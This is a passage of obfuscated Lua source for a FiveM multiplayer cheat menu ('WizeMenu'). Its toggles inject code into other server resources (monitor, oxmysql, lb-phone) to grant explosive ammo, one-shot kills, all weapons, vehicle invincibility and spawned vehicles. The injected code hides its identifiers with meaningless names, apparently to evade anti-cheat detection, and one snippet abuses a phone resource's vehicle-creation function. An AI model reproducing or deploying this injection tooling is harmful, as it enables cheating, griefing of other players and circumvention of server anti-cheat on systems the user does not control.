                            Wait(0)
                        end
                    end)
                end

                qUwKZopRM8()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                LkJgFdSaQwErTy = false

                local function yFBN9pqXcL()
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                    QwErTyUiOpAsDf(AsDfGhJkLzXcVb(), false)
                end

                yFBN9pqXcL()
            ]]);end);MachoMenuCheckbox(v41[1027 -(834 + 192) ],"Explosive Ammo",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
                QzWxEdCvTrBnYu = true

                local function WpjLRqtm28()
                    if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
                    QzWxEdCvTrBnYu = true

                    local UyJhNbGtFrVbCx = CreateThread
                    UyJhNbGtFrVbCx(function()
                        local HnBvFrTgYhUzKl = PlayerPedId
                        local TmRgVbYhNtKjLp = GetPedLastWeaponImpactCoord
                        local JkLpHgTfCvXzQa = AddOwnedExplosion

                        while QzWxEdCvTrBnYu and not Unloaded do
                            local CvBnYhGtFrLpKm = HnBvFrTgYhUzKl()
                            local XsWaQzEdCvTrBn, PlKoMnBvCxZlQj = TmRgVbYhNtKjLp(CvBnYhGtFrLpKm)

                            if XsWaQzEdCvTrBn then
                                JkLpHgTfCvXzQa(CvBnYhGtFrLpKm, PlKoMnBvCxZlQj.x, PlKoMnBvCxZlQj.y, PlKoMnBvCxZlQj.z, 6, 1.0, true, false, 0.0)
                            end

                            Wait(0)
                        end
                    end)
                end

                WpjLRqtm28()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                QzWxEdCvTrBnYu = false
            ]]);end);MachoMenuCheckbox(v41[1],"Oneshot Kill",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if RfGtHyUjMiKoLp == nil then RfGtHyUjMiKoLp = false end
                RfGtHyUjMiKoLp = true

                local function xUQp7AK0tv()
                    local PlMnBvCxZaSdFg = CreateThread
                    PlMnBvCxZaSdFg(function()
                        local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                        local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                        local ErTyUiOpAsDfGh = PlayerPedId

                        while RfGtHyUjMiKoLp do
                            if Unloaded then
                                RfGtHyUjMiKoLp = false
                                break
                            end

                            local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                            if Wp and Wp ~= 0 then
                                AsDfGhJkLzXcVb(Wp, 1000.0)
                            end

                            Wait(0)
                        end
                    end)
                end

                xUQp7AK0tv()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                RfGtHyUjMiKoLp = false
                local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                local ErTyUiOpAsDfGh = PlayerPedId
                local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                if Wp and Wp ~= 0 then
                    AsDfGhJkLzXcVb(Wp, 1.0)
                end
            ]]);end);MachoMenuButton(v41[1 + 1 ],"Give All Weapons + Max Ammo",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
        local function GiveAllWeapons()
            local ped = PlayerPedId()
            local ammo = 1200

            local weapons = {
                -- MELEE
                "WEAPON_UNARMED",
                "WEAPON_KNIFE",
                "WEAPON_KNUCKLE",
                "WEAPON_NIGHTSTICK",
                "WEAPON_HAMMER",
                "WEAPON_BAT",
                "WEAPON_GOLFCLUB",
                "WEAPON_CROWBAR",
                "WEAPON_BOTTLE",
                "WEAPON_DAGGER",
                "WEAPON_HATCHET",
                "WEAPON_MACHETE",
                "WEAPON_FLASHLIGHT",
                "WEAPON_SWITCHBLADE",
                "WEAPON_POOLCUE",
                "WEAPON_PIPEWRENCH",

                -- HANDGUNS
                "WEAPON_PISTOL",
                "WEAPON_PISTOL_MK2",
                "WEAPON_COMBATPISTOL",
                "WEAPON_APPISTOL",
                "WEAPON_REVOLVER",
                "WEAPON_REVOLVER_MK2",
                "WEAPON_DOUBLEACTION",
                "WEAPON_PISTOL50",
                "WEAPON_SNSPISTOL",
                "WEAPON_SNSPISTOL_MK2",
                "WEAPON_HEAVYPISTOL",
                "WEAPON_VINTAGEPISTOL",
                "WEAPON_STUNGUN",
                "WEAPON_FLAREGUN",
                "WEAPON_MARKSMANPISTOL",
                "WEAPON_RAYPISTOL",
                "WEAPON_CERAMICPISTOL",
                "WEAPON_NAVYREVOLVER",
                "WEAPON_GADGETPISTOL",

                -- SMGs & MG
                "WEAPON_MICROSMG",
                "WEAPON_MINISMG",
                "WEAPON_SMG",
                "WEAPON_SMG_MK2",
                "WEAPON_ASSAULTSMG",
                "WEAPON_COMBATPDW",
                "WEAPON_MACHINEPISTOL",
                "WEAPON_MG",
                "WEAPON_COMBATMG",
                "WEAPON_COMBATMG_MK2",
                "WEAPON_GUSENBERG",

                -- ASSAULT RIFLES
                "WEAPON_ASSAULTRIFLE",
                "WEAPON_ASSAULTRIFLE_MK2",
                "WEAPON_CARBINERIFLE",
                "WEAPON_CARBINERIFLE_MK2",
                "WEAPON_ADVANCEDRIFLE",
                "WEAPON_SPECIALCARBINE",
                "WEAPON_SPECIALCARBINE_MK2",
                "WEAPON_BULLPUPRIFLE",
                "WEAPON_BULLPUPRIFLE_MK2",
                "WEAPON_COMPACTRIFLE",
                "WEAPON_MILITARYRIFLE",
                "WEAPON_HEAVYRIFLE",

                -- SHOTGUNS
                "WEAPON_PUMPSHOTGUN",
                "WEAPON_PUMPSHOTGUN_MK2",
                "WEAPON_SAWNOFFSHOTGUN",
                "WEAPON_BULLPUPSHOTGUN",
                "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET",
                "WEAPON_HEAVYSHOTGUN",
                "WEAPON_DBSHOTGUN",
                "WEAPON_AUTOSHOTGUN",
                "WEAPON_BATTLEAXE",
                "WEAPON_COMPACTLAUNCHER",

                -- SNIPER RIFLES
                "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER",
                "WEAPON_HEAVYSNIPER_MK2",
                "WEAPON_MARKSMANRIFLE",
                "WEAPON_MARKSMANRIFLE_MK2",

                -- HEAVY / THROWABLE
                "WEAPON_GRENADELAUNCHER",
                "WEAPON_GRENADELAUNCHER_SMOKE",
                "WEAPON_RPG",
                "WEAPON_STINGER",
                "WEAPON_FIREWORK",
                "WEAPON_HOMINGLAUNCHER",
                "WEAPON_GRENADELAUNCHER",
                "WEAPON_COMPACTLAUNCHER",
                "WEAPON_RAILGUN",
                "WEAPON_MINIGUN",
                "WEAPON_RAYMINIGUN",
                "WEAPON_RAYCARBINE",

                -- THROWABLES
                "WEAPON_GRENADE",
                "WEAPON_STICKYBOMB",
                "WEAPON_PROXMINE",
                "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE",
                "WEAPON_MOLOTOV",
                "WEAPON_FIREEXTINGUISHER",
                "WEAPON_PETROLCAN",
                "WEAPON_BALL",
                "WEAPON_SNOWBALL",
                "WEAPON_FLARE",
                "WEAPON_BIRDCRAP"
            }

            -- Remove current weapons
            RemoveAllPedWeapons(ped, true)

            -- Give all weapons with max ammo
            for _, weaponName in ipairs(weapons) do
                local hash = GetHashKey(weaponName)
                GiveWeaponToPed(ped, hash, ammo, false, true)
                SetPedInfiniteAmmo(ped, true, hash)
            end

            -- Select first weapon
            SetCurrentPedWeapon(ped, GetHashKey("WEAPON_PISTOL"), true)
        end

        GiveAllWeapons()
        print("^2[WizeMenu] All weapons given + max ammo!")
    ]]);end);local v58=0 + 0 ;local v59={[0 + 0 ]={name="Default",hash="MP_F_Freemode"},[1]={name="Gangster",hash="Gang1H"},[2]={name="Wild",hash="GangFemale"},[3]={name="Red Neck",hash="Hillbilly"}};MachoMenuDropDown(v41[4 -1 ],"Aiming Style",function(v214) v58=v214;end,"Default","Gangster","Wild","Red Neck");MachoMenuButton(v41[307 -(300 + 4) ],"Apply Aiming Style",function() local v215=v59[v58];if  not v215 then return;end MachoInjectResource((v47("oxmysql") and "oxmysql") or "any" ,([[
                local function vXK2dPLR07()
                    local UiOpAsDfGhJkLz = PlayerPedId
                    local PlMnBvCxZaSdFg = GetHashKey
                    local QwErTyUiOpAsDf = SetWeaponAnimationOverride

                    local MnBvCxZaSdFgHj = PlMnBvCxZaSdFg("%s")
                    QwErTyUiOpAsDf(UiOpAsDfGhJkLz(), MnBvCxZaSdFgHj)
                end

                vXK2dPLR07()

            ]]):format(v215.hash));end);MachoMenuCheckbox(v42[1],"Vehicle Godmode",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                zXcVbNmQwErTyUi = true

                local function LWyZoXRbqK()
                    local LkJhGfDsAzXcVb = CreateThread
                    LkJhGfDsAzXcVb(function()
                        while zXcVbNmQwErTyUi and not Unloaded do
                            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                            local TyUiOpAsDfGhJkL = PlayerPedId
                            local AsDfGhJkLzXcVbN = SetEntityInvincible

                            local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                            if vehicle and vehicle ~= 0 then
                                AsDfGhJkLzXcVbN(vehicle, true)
                            end
                            Wait(0)
                        end
                    end)
                end

                LWyZoXRbqK()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                zXcVbNmQwErTyUi = false
                local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                local TyUiOpAsDfGhJkL = PlayerPedId
                local AsDfGhJkLzXcVbN = SetEntityInvincible

                local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
                if vehicle and vehicle ~= 0 then
                    AsDfGhJkLzXcVbN(vehicle, false)
                end
            ]]);end);MachoMenuCheckbox(v42[1],"Force Vehicle Engine",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                GhYtReFdCxWaQzLp = true

                local function OpAsDfGhJkLzXcVb()
                    local lMnbVcXzZaSdFg = CreateThread
                    lMnbVcXzZaSdFg(function()
                        local QwErTyUiOp         = _G.PlayerPedId
                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                        local function _tick(vh)
                            if vh and vh ~= 0 then
                                No_Hotwire_Set(vh, false)
                                En_g_Degrade_Set(vh, false)
                                ErTyUiOpAsDfGh(vh, false)
                                KeEpOnAb(vh, true)

                                local eh = En_g_Health_Get(vh)
                                if (not eh) or eh < 300.0 then
                                    En_g_Health_Set(vh, 900.0)
                                end

                                ZxCvBnMqWeRtYu(vh, true, true, true)
                            end
                        end

                        while GhYtReFdCxWaQzLp and not Unloaded do
                            local p  = QwErTyUiOp()

                            _tick(AsDfGhJkLz(p, false))
                            _tick(TyUiOpAsDfGh(p))
                            _tick(AsDfGhJkLz(p, true))

                            Wait(0)
                        end
                    end)
                end

                OpAsDfGhJkLzXcVb()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                GhYtReFdCxWaQzLp = false
                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                if v and v ~= 0 then
                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                    SetVehicleEngineCanDegrade(v, true)
                    SetVehicleUndriveable(v, false)
                end
            ]]);end);MachoMenuCheckbox(v42[1 + 0 ],"Vehicle Auto Repair",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
                PlAsQwErTyUiOp = true

                local function uPkqLXTm98()
                    local QwErTyUiOpAsDf = CreateThread
                    QwErTyUiOpAsDf(function()
                        while PlAsQwErTyUiOp and not Unloaded do
                            local AsDfGhJkLzXcVb = PlayerPedId
                            local LzXcVbNmQwErTy = GetVehiclePedIsIn
                            local VbNmLkJhGfDsAz = SetVehicleFixed
                            local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                            local ped = AsDfGhJkLzXcVb()
                            local vehicle = LzXcVbNmQwErTy(ped, false)
                            if vehicle and vehicle ~= 0 then
                                VbNmLkJhGfDsAz(vehicle)
                                MnBvCxZaSdFgHj(vehicle, 0.0)
                            end

                            Wait(0)
                        end
                    end)
                end

                uPkqLXTm98()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                PlAsQwErTyUiOp = false
            ]]);end);MachoMenuCheckbox(v42[1],"Freeze Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
                LzKxWcVbNmQwErTy = true

                local function WkQ79ZyLpT()
                    local tYhGtFrDeSwQaZx = CreateThread
                    local xCvBnMqWeRtYuIo = PlayerPedId
                    local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
                    local gKdNqLpYxMiV = FreezeEntityPosition
                    local jBtWxFhPoZuR = Wait

                    tYhGtFrDeSwQaZx(function()
                        while LzKxWcVbNmQwErTy and not Unloaded do
                            local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                            local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                            if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                                gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                            end
                            jBtWxFhPoZuR(0)
                        end
                    end)
                end

                WkQ79ZyLpT()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                LzKxWcVbNmQwErTy = false

                local function i7qWlBXtPo()
                    local yUiOpAsDfGhJkLz = PlayerPedId
                    local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                    local FdSaPlMnBvCxZlK = FreezeEntityPosition

                    local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
                    local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
                    if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                        FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
                    end
                end

                i7qWlBXtPo()
            ]]);end);MachoMenuCheckbox(v42[1],"Vehicle Hop",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
                NuRqVxEyKiOlZm = true

                local function qPTnXLZKyb()
                    local ZlXoKmVcJdBeTr = CreateThread
                    ZlXoKmVcJdBeTr(function()
                        while NuRqVxEyKiOlZm and not Unloaded do
                            local GvHnMzLoPqAxEs = PlayerPedId
                            local DwZaQsXcErDfGt = GetVehiclePedIsIn
                            local BtNhUrLsEkJmWq = IsDisabledControlPressed
                            local PlZoXvNyMcKwQi = ApplyForceToEntity

                            local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                            local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                            if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                                PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                            end

                            Wait(0)
                        end
                    end)
                end

                qPTnXLZKyb()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                NuRqVxEyKiOlZm = false
            ]]);end);MachoMenuCheckbox(v42[2 -1 ],"Rainbow Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                GxRpVuNzYiTq = true

                local function jqX7TvYzWq()
                    local WvBnMpLsQzTx = GetGameTimer
                    local VcZoPwLsEkRn = math.floor
                    local DfHkLtQwAzCx = math.sin
                    local PlJoQwErTgYs = CreateThread
                    local MzLxVoKsUyNz = GetVehiclePedIsIn
                    local EyUiNkOpLtRg = PlayerPedId
                    local KxFwEmTrZpYq = DoesEntityExist
                    local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                    local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

                    local yGfTzLkRn = 1.0

                    local function HrCvWbXuNz(freq)
                        local color = {}
                        local t = WvBnMpLsQzTx() / 1000
                        color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                        color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                        color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                        return color
                    end

                    PlJoQwErTgYs(function()
                        while GxRpVuNzYiTq and not Unloaded do
                            local ped = EyUiNkOpLtRg()
                            local veh = MzLxVoKsUyNz(ped, false)
                            if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                local rgb = HrCvWbXuNz(yGfTzLkRn)
                                UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                            end
                            Wait(0)
                        end
                    end)
                end

                jqX7TvYzWq()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                GxRpVuNzYiTq = false
            ]]);end);MachoMenuCheckbox(v42[363 -(112 + 250) ],"Drift Mode (Hold Shift)",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
                MqTwErYuIoLp = true

                local function PlRtXqJm92()
                    local XtFgDsQwAzLp = CreateThread
                    local UiOpAsDfGhKl = PlayerPedId
                    local JkHgFdSaPlMn = GetVehiclePedIsIn
                    local WqErTyUiOpAs = IsControlPressed
                    local AsZxCvBnMaSd = DoesEntityExist
                    local KdJfGvBhNtMq = SetVehicleReduceGrip

                    XtFgDsQwAzLp(function()
                        while MqTwErYuIoLp and not Unloaded do
                            Wait(0)
                            local ped = UiOpAsDfGhKl()
                            local veh = JkHgFdSaPlMn(ped, false)
                            if veh ~= 0 and AsZxCvBnMaSd(veh) then
                                if WqErTyUiOpAs(0, 21) then
                                    KdJfGvBhNtMq(veh, true)
                                else
                                    KdJfGvBhNtMq(veh, false)
                                end
                            end
                        end
                    end)
                end

                PlRtXqJm92()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                MqTwErYuIoLp = false
                local ZtQwErTyUiOp = PlayerPedId
                local DfGhJkLzXcVb = GetVehiclePedIsIn
                local VbNmAsDfGhJk = DoesEntityExist
                local NlJkHgFdSaPl = SetVehicleReduceGrip

                local ped = ZtQwErTyUiOp()
                local veh = DfGhJkLzXcVb(ped, false)
                if veh ~= 0 and VbNmAsDfGhJk(veh) then
                    NlJkHgFdSaPl(veh, false)
                end
            ]]);end);MachoMenuCheckbox(v42[1 + 0 ],"Easy Handling",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                NvGhJkLpOiUy = true

                local function KbZwVoYtLx()
                    local BtGhYtUlOpLk = CreateThread
                    local WeRtYuIoPlMn = PlayerPedId
                    local TyUiOpAsDfGh = GetVehiclePedIsIn
                    local UyTrBnMvCxZl = SetVehicleGravityAmount
                    local PlMnBvCxZaSd = SetVehicleStrong

                    BtGhYtUlOpLk(function()
                        while NvGhJkLpOiUy and not Unloaded do
                            local ped = WeRtYuIoPlMn()
                            local veh = TyUiOpAsDfGh(ped, false)
                            if veh and veh ~= 0 then
                                UyTrBnMvCxZl(veh, 73.0)
                                PlMnBvCxZaSd(veh, true)
                            end
                            Wait(0)
                        end

                        local ped = WeRtYuIoPlMn()
                        local veh = TyUiOpAsDfGh(ped, false)
                        if veh and veh ~= 0 then
                            UyTrBnMvCxZl(veh, 9.8)
                            PlMnBvCxZaSd(veh, false)
                        end
                    end)
                end

                KbZwVoYtLx()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                NvGhJkLpOiUy = false
                local UyTrBnMvCxZl = SetVehicleGravityAmount
                local PlMnBvCxZaSd = SetVehicleStrong
                local ped = PlayerPedId()
                local veh = GetVehiclePedIsIn(ped, false)
                if veh and veh ~= 0 then
                    UyTrBnMvCxZl(veh, 9.8)
                    PlMnBvCxZaSd(veh, false)
                end
            ]]);end);MachoMenuCheckbox(v42[1],"Shift Boost",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
                QwErTyUiOpSh = true

                local function ZxCvBnMmLl()
                    local aAaBbCcDdEe = CreateThread
                    local fFfGgGgHhIi = Wait
                    local jJkKlLmMnNo = PlayerPedId
                    local pPqQrRsStTu = IsPedInAnyVehicle
                    local vVwWxXyYzZa = GetVehiclePedIsIn
                    local bBcCdDeEfFg = IsDisabledControlJustPressed
                    local sSeEtTvVbBn = SetVehicleForwardSpeed

                    aAaBbCcDdEe(function()
                        while QwErTyUiOpSh and not Unloaded do
                            local _ped = jJkKlLmMnNo()
                            if pPqQrRsStTu(_ped, false) then
                                local _veh = vVwWxXyYzZa(_ped, false)
                                if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                                    sSeEtTvVbBn(_veh, 150.0)
                                end
                            end
                            fFfGgGgHhIi(0)
                        end
                    end)
                end

                ZxCvBnMmLl()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                QwErTyUiOpSh = false
            ]]);end);MachoMenuCheckbox(v42[1],"Instant Breaks",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                VkLpOiUyTrEq = true

                local function YgT7FrqXcN()
                    local ZxSeRtYhUiOp = CreateThread
                    local LkJhGfDsAzXv = PlayerPedId
                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                    local ErTyUiOpAsDf = IsDisabledControlPressed
                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                    local VbNmQwErTyUi = SetVehicleForwardSpeed

                    ZxSeRtYhUiOp(function()
                        while VkLpOiUyTrEq and not Unloaded do
                            local ped = LkJhGfDsAzXv()
                            local veh = PoLkJhBgVfCd(ped, false)
                            if veh and veh ~= 0 then
                                if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                    VbNmQwErTyUi(veh, 0.0)
                                end
                            end
                            Wait(0)
                        end
                    end)
                end

                YgT7FrqXcN()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                VkLpOiUyTrEq = false
            ]]);end);MachoMenuCheckbox(v42[2 -1 ],"Unlimited Fuel",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                BlNkJmLzXcVb = true

                local function LqWyXpR3tV()
                    local TmPlKoMiJnBg = CreateThread
                    local ZxCvBnMaSdFg = PlayerPedId
                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                    local VcXzQwErTyUi = GetVehiclePedIsIn
                    local KpLoMkNjBhGt = DoesEntityExist
                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                    TmPlKoMiJnBg(function()
                        while BlNkJmLzXcVb and not Unloaded do
                            local ped = ZxCvBnMaSdFg()
                            if YhUjIkOlPlMn(ped, false) then
                                local veh = VcXzQwErTyUi(ped, false)
                                if KpLoMkNjBhGt(veh) then
                                    JkLzXcVbNmAs(veh, 100.0)
                                end
                            end
                            Wait(100)
                        end
                    end)
                end

                LqWyXpR3tV()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                BlNkJmLzXcVb = false
            ]]);end);local v60=MachoMenuInputbox(v42[2 + 0 ],"License Plate:","...");MachoMenuButton(v42[2 + 0 ],"Set License Plate",function() local v216=MachoMenuGetInputbox(v60);if ((type(v216)=="string") and (v216~="")) then local v284=0 + 0 ;local v285;while true do if ((0 + 0)==v284) then v285=string.format([[
                    local function xKqLZVwPt9()
                        local XcVbNmAsDfGhJkL = PlayerPedId
                        local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                        local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                        local pEd = XcVbNmAsDfGhJkL()
                        local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                        if vEh and vEh ~= 0 then
                            PoIuYtReWqAzXsDc(vEh, "%s")
                        end

                    end

                    xKqLZVwPt9()
                ]],v216);MachoInjectResource((v47("monitor") and "monitor") or "any" ,v285);break;end end end end);local v61=MachoMenuInputbox(v42[2 + 0 ],"Vehicle Model:","...");MachoMenuButton(v42[1416 -(1001 + 413) ],"Spawn Car",function() local v217=0;local v218;local v219;local v220;local v221;while true do if ((4 -2)==v217) then if ( not v219 and v220) then local v358=0;while true do if (v358==(882 -(244 + 638))) then v221=([[ 
                    if type(CreateFrameworkVehicle) == "function" then
                        local model = "%s"
                        local hash = GetHashKey(model)
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) then
                            local coords = GetEntityCoords(ped)
                            if coords then
                                local vehicleData = {
                                    vehicle = json.encode({ model = model })
                                }
                                CreateFrameworkVehicle(vehicleData, coords)
                            end
                        end
                    end
                ]]):format(v218);MachoInjectResource("lb-phone",v221);break;end end else local v359=0;while true do if (v359==(693 -(627 + 66))) then v221=([[ 
                    local function XzRtVbNmQwEr()
                        local tYaPlXcUvBn = PlayerPedId
                        local iKoMzNbHgTr = GetEntityCoords
                        local wErTyUiOpAs = GetEntityHeading
                        local hGtRfEdCvBg = RequestModel
                        local bNjMkLoIpUh = HasModelLoaded
                        local pLkJhGfDsAq = Wait
                        local sXcVbNmZlQw = GetVehiclePedIsIn
                        local yUiOpAsDfGh = DeleteVehicle
                        local aSxDcFgHvBn = _G.CreateVehicle
                        local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                        local zMxNaLoKvRe = SetEntityAsMissionEntity
                        local mVbGtRfEdCv = SetVehicleOutOfControl
                        local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                        local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                        local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                        local vBtNrEuPwOa = SetNetworkIdCanMigrate
                        local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                        local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                        local bPeDrTfGyHu = tYaPlXcUvBn()
                        local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                        local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                        local nMiLoPzXwEq = "%s"

                        hGtRfEdCvBg(nMiLoPzXwEq)
                        while not bNjMkLoIpUh(nMiLoPzXwEq) do
                            pLkJhGfDsAq(100)
                        end

                        local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                        if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                            yUiOpAsDfGh(fVbGtFrEdSw)
                        end

                        local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                        local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                        zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                        mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                        eDsFgHjKlQw(xFrEdCvBgTn, false)
                        lAzSdXfCvBg(sMnLoKiJpUb, true)
                        nMqWlAzXcVb(xFrEdCvBgTn, false)
                        vBtNrEuPwOa(sMnLoKiJpUb, true)
                        gHrTyUjLoPk(nMiLoPzXwEq)

                        kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
                    end

                    XzRtVbNmQwEr()
